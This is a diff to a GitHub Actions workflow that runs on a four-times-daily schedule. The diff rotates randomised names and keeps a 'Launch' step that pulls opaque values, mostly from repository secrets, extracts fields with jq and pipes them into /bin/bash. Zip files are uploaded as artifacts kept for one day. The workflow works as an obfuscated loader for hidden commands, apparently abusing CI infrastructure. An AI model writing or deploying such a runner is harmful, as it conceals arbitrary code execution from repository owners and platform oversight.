@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '12 3,9,15,21 * * *'
+    - cron: '33 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          lmn588: ${{ secrets.lmn588 }}
+          qrd15131: ${{ secrets.qrd15131 }}
         run: |
-          printf '%s' "$lmn588" | jq -r .dsa51047 | /bin/bash
-          echo $g37989 | jq -r .s4127 | /bin/bash
-          echo $bwl98 | jq -r .v356 | /bin/bash
-          echo $x88775 | jq -r .aajd6 | /bin/bash
-          echo $yglb80 | jq -r .iunlq1 | /bin/bash
-          printf '%s' "$cxucm052" | jq -r .fpvq94 | /bin/bash
+          printf '%s' "$qrd15131" | jq -r .cx861 | /bin/bash
+          printf '%s' "$sa9742" | jq -r .sao74980 | /bin/bash
+          echo $wzh65509 | jq -r .rhd31711 | /bin/bash
+          printf '%s' "$yewf8" | jq -r .j2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: dHJGNeF2
+          name: h8wqIsat
           path: "*.zip"
           retention-days: 1
